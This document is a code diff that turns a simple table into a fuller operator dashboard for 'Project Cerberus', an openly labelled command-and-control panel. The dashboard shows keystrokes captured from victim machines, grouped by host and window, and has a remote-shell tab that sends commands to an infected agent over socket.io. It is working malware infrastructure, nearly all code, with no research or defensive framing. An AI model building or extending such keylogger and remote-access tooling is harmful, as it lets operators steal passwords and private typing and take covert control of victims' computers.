@@ -1,33 +1,299 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta http-equiv="refresh" content="10"> <!-- refresh the page every 10 seconds -->
-    <title>C2 Dashboard</title>
+    <meta charset="UTF-8">
+    <title>Project Cerberus — C2</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js"></script>
     <style>
-        body { font-family: monospace; background: #111; color: #00ff00; padding: 20px; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
-        th { background: #222; }
-        tr:hover { background: #1a1a1a; }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background: #0d0d0d;
+            color: #c8ffc8;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            min-height: 100vh;
+        }
+
+        /* ── Header ── */
+        header {
+            background: #111;
+            border-bottom: 1px solid #1a3a1a;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+
+        h1 {
+            font-size: 14px;
+            font-weight: bold;
+            color: #00ff41;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+
+        h1 .dim { color: #2d5c2d; font-weight: normal; }
+
+        /* ── Tabs ── */
+        .tabs { display: flex; gap: 4px; }
+
+        .tab {
+            background: none;
+            border: 1px solid #1f3a1f;
+            color: #4a7a4a;
+            padding: 5px 18px;
+            font-family: inherit;
+            font-size: 12px;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: border-color 0.1s, color 0.1s;
+        }
+
+        .tab:hover { border-color: #00ff41; color: #c8ffc8; }
+
+        .tab.active {
+            background: #071407;
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        /* ── Panels ── */
+        .panel { display: none; padding: 20px 24px; }
+        .panel.active { display: block; }
+
+        /* ── Keystrokes panel ── */
+        .status-bar {
+            font-size: 11px;
+            color: #2d5c2d;
+            margin-bottom: 16px;
+            letter-spacing: 1px;
+        }
+
+        .machine-card {
+            border: 1px solid #1a3a1a;
+            margin-bottom: 20px;
+        }
+
+        .machine-header {
+            background: #071407;
+            padding: 8px 14px;
+            font-size: 12px;
+            color: #00ff41;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #1a3a1a;
+        }
+
+        .session-block {
+            padding: 10px 14px;
+            border-bottom: 1px solid #0f1f0f;
+        }
+
+        .session-block:last-child { border-bottom: none; }
+
+        .session-header {
+            font-size: 11px;
+            color: #3a6a3a;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
+        }
+
+        .session-keys {
+            color: #c8ffc8;
+            white-space: pre-wrap;
+            word-break: break-all;
+            line-height: 1.7;
+        }
+
+        .special-key {
+            color: #3a6a3a;
+            font-size: 11px;
+        }
+
+        .no-data { color: #2d5c2d; padding: 16px 0; letter-spacing: 1px; }
+
+        /* ── Shell panel ── */
+        #shell-output {
+            height: calc(100vh - 148px);
+            min-height: 300px;
+            overflow-y: auto;
+            background: #060606;
+            border: 1px solid #1a3a1a;
+            padding: 12px 14px;
+            white-space: pre-wrap;
+            word-break: break-word;
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+
+        .shell-cmd    { color: #00ff41; }
+        .shell-output-text { color: #8ab88a; }
+
+        #input-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #1a3a1a;
+            background: #060606;
+            padding: 8px 14px;
+        }
+
+        .prompt { color: #00ff41; user-select: none; }
+
+        #cmd {
+            flex: 1;
+            background: none;
+            border: none;
+            color: #c8ffc8;
+            font-family: inherit;
+            font-size: 13px;
+            outline: none;
+        }
+
+        #send-btn {
+            background: none;
+            border: 1px solid #1f3a1f;
+            color: #4a7a4a;
+            padding: 4px 14px;
+            font-family: inherit;
+            font-size: 12px;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: border-color 0.1s, color 0.1s;
+        }
+
+        #send-btn:hover { border-color: #00ff41; color: #00ff41; }
     </style>
 </head>
 <body>
-    <h1>Project Cerberus — C&C Dashboard</h1>
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>Machine</th>
-            <th>Timestamp</th>
-            <th>Data</th>
-        </tr>
-        {% for row in rows %}
-        <tr>
-            <td>{{ row["id"] }}</td>
-            <td>{{ row["machine"] }}</td>
-            <td>{{ row["timestamp"] }}</td>
-            <td>{{ row["data"] }}</td>
-        </tr>
-        {% endfor %}
-    </table>
+
+<header>
+    <h1>cerberus <span class="dim">// c2</span></h1>
+    <div class="tabs">
+        <button id="tab-keystrokes" class="tab active" onclick="showTab('keystrokes')">Keystrokes</button>
+        <button id="tab-shell"      class="tab"        onclick="showTab('shell')">Remote Shell</button>
+    </div>
+</header>
+
+<!-- Keystrokes panel -->
+<div id="panel-keystrokes" class="panel active">
+    <div id="status-bar" class="status-bar">connecting...</div>
+    <div id="logs-container"></div>
+</div>
+
+<!-- Shell panel -->
+<div id="panel-shell" class="panel">
+    <div id="shell-output"></div>
+    <div id="input-row">
+        <span class="prompt">$&nbsp;</span>
+        <input id="cmd" type="text" placeholder="enter command..." autocomplete="off" spellcheck="false" />
+        <button id="send-btn" onclick="sendCommand()">send</button>
+    </div>
+</div>
+
+<script>
+    // ── Tab switching ─────────────────────────────────────────────────────────
+    function showTab(name) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.getElementById('panel-' + name).classList.add('active');
+        document.getElementById('tab-' + name).classList.add('active');
+    }
+
+    // ── Keystroke rendering ───────────────────────────────────────────────────
+    function formatKeys(raw) {
+        const escaped = raw
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+        return escaped
+            .replace(/\[Key\.enter\]/g,     '<span class="special-key">↵</span>\n')
+            .replace(/\[Key\.backspace\]/g,  '<span class="special-key">⌫</span>')
+            .replace(/\[Key\.tab\]/g,        '<span class="special-key">→</span>')
+            .replace(/\[Key\.\w+\]/g, m => '<span class="special-key">' + m + '</span>');
+    }
+
+    function renderLogs(rows) {
+        const container = document.getElementById('logs-container');
+        if (!rows.length) {
+            container.innerHTML = '<div class="no-data">// no data received yet</div>';
+            return;
+        }
+
+        // group by machine, preserve first-seen order
+        const machines = {};
+        for (const row of rows) {
+            if (!machines[row.machine]) machines[row.machine] = [];
+            machines[row.machine].push(row);
+        }
+
+        let html = '';
+        for (const [machine, sessions] of Object.entries(machines)) {
+            html += `<div class="machine-card">`;
+            html += `<div class="machine-header">// ${machine}</div>`;
+            for (const s of sessions) {
+                const win  = s.window || '—';
+                const keys = formatKeys(s.data || '');
+                html += `<div class="session-block">`;
+                html += `<div class="session-header">[${s.timestamp}]  ${win}</div>`;
+                html += `<div class="session-keys">${keys}</div>`;
+                html += `</div>`;
+            }
+            html += `</div>`;
+        }
+        container.innerHTML = html;
+    }
+
+    // ── Keystroke polling ─────────────────────────────────────────────────────
+    async function pollLogs() {
+        try {
+            const res  = await fetch('/api/logs');
+            const rows = await res.json();
+            renderLogs(rows);
+            const ts = new Date().toLocaleTimeString();
+            document.getElementById('status-bar').textContent =
+                `// updated ${ts}  —  ${rows.length} entries`;
+        } catch (e) {
+            document.getElementById('status-bar').textContent =
+                '// connection error — retrying...';
+        }
+    }
+
+    pollLogs();
+    setInterval(pollLogs, 10000);
+
+    // ── Shell (socket.io) ─────────────────────────────────────────────────────
+    const socket   = io();
+    const output   = document.getElementById('shell-output');
+    const cmdInput = document.getElementById('cmd');
+
+    function appendShell(text, cls) {
+        const div = document.createElement('div');
+        div.className = cls;
+        div.textContent = text;
+        output.appendChild(div);
+        output.scrollTop = output.scrollHeight;
+    }
+
+    appendShell('[waiting for agent to connect...]', 'shell-output-text');
+
+    socket.on('shell_output', function(data) {
+        appendShell(data.output, 'shell-output-text');
+    });
+
+    function sendCommand() {
+        const cmd = cmdInput.value.trim();
+        if (!cmd) return;
+        appendShell('$ ' + cmd, 'shell-cmd');
+        socket.emit('shell_command', { command: cmd });
+        cmdInput.value = '';
+    }
+
+    cmdInput.addEventListener('keydown', e => {
+        if (e.key === 'Enter') sendCommand();
+    });
+</script>
+
 </body>
 </html>
